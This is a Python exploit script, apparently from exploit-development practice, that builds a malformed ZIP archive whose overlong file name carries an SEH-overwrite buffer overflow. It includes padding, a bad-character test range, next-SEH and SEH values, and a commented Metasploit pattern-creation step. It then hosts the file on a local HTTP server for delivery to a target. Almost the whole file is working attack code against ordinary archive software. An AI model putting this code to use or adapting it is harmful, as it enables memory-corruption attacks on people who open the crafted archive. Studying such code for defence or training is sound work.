#!/usr/bin/python3

import struct
import socketserver
import subprocess
import http.server


def create_file(offset):
    badchars = (#b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40")
#b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5d\x5e\x5f")
#b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f")
#b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f")
#b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf")
#b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf")
#b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

    seh = struct.pack("<I", 0x00451845)
    nseh = b"\xdb\xf4\xdc\xf4"
    #cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %d" % offset
    #filename = subprocess.check_output(cmd, shell=True)
    filename = b"A"*(offset - len(badchars)) + badchars + nseh + seh + b"D"*(4000 - offset - 8)
    filename = filename.strip() + b".txt"
    local_file_header = b"\x50\x4b\x03\x04" # Local File signature
    local_file_header += b"\x14\x00" # minimum version needed to extract
    local_file_header += b"\x00\x00" # General purpose bit flag
    local_file_header += b"\x00\x00" # Compression method
    local_file_header += b"\xb7\xac" # File last modification time
    local_file_header += b"\xce\x34" # File last modification date
    local_file_header += b"\x00\x00\x00\x00" # CRC-32
    local_file_header += b"\x00\x00\x00\x00" # Compressed size
    local_file_header += b"\x00\x00\x00\x00" # Uncompressed size
    local_file_header += b"\x00\x0f" # File name length
    local_file_header += b"\x00\x00" # Extra field length
    local_file_header += filename # File name
    local_file_header += b"" # Extra field

    data = ""
    # data_descriptor is only used when the CRC isn't known when the file is generated
    data_descriptor = b"\x50\x4b\x07\x08" # Optional data descriptor signature
    data_descriptor += b"\x00\x00\x00\x00" # CRC-32
    data_descriptor += b"\x00\x00\x00\x00" # Compressed size
    data_descriptor += b"\x00\x00\x00\x00" # Uncompressed size
    
    central_file_directory_header = b"\x50\x4b\x01\x02" # Central directory file header signature
    central_file_directory_header += b"\x14\x00" # version made by
    central_file_directory_header += b"\x14\x00" # minimum version needed to extract
    central_file_directory_header += b"\x00\x00" # general purpose bit flag
    central_file_directory_header += b"\x00\x00" # Compression method
    central_file_directory_header += b"\xb7\xac" # File last modification time
    central_file_directory_header += b"\xce\x34" # File last modification date
    central_file_directory_header += b"\x00\x00\x00\x00" # CRC-32
    central_file_directory_header += b"\x00\x00\x00\x00" # Compressed size
    central_file_directory_header += b"\x00\x00\x00\x00" # Uncompressed size
    central_file_directory_header += b"\x00\x0f" # File name length
    central_file_directory_header += b"\x00\x00" # Extra field length
    central_file_directory_header += b"\x00\x00" # File comment length
    central_file_directory_header += b"\x00\x00" # Disk number where file starts
    central_file_directory_header += b"\x00\x00" # Internal file attributes
    central_file_directory_header += b"\x00\x00\x00\x00" # External file attributes
    central_file_directory_header += b"\x00\x00\x00\x00" # Relative offset of local file header
    central_file_directory_header += filename # File name
    central_file_directory_header += b"" # Extra field
    central_file_directory_header += b"" # File comment
    
    # eocd = end of central directory record
    eocd = b"\x50\x4b\x05\x06" # eocd signature
    eocd += b"\x00\x00" # number of this disk
    eocd += b"\x00\x00" # disk where central directory starts
    eocd += b"\x01\x00" # Number of central directory records on this disk
    eocd += b"\x01\x00" # total number of central directory records
    eocd += b"\x12\x10\x00\x00" # Size of central directory
    eocd += b"\x02\x10\x00\x00" # Offset of start of central directory relative to start of archive
    eocd += b"\x00\x00" # Comment length
    eocd += b"" # Comment

    attack = local_file_header + central_file_directory_header + eocd

    file = open("test1.zip", "wb")
    file.write(attack)
    file.close()

def serve_directory():
    port = 8000 
    ip = "192.168.255.130"
    httpServer = socketserver.TCPServer((ip, port), http.server.SimpleHTTPRequestHandler)
    print("[+] Starting HTTP Server on " + ip + " port " + str(port))
    httpServer.serve_forever()

def main():
    offset = 1022
    create_file(offset)
    serve_directory()

if __name__ == "__main__":
    main()
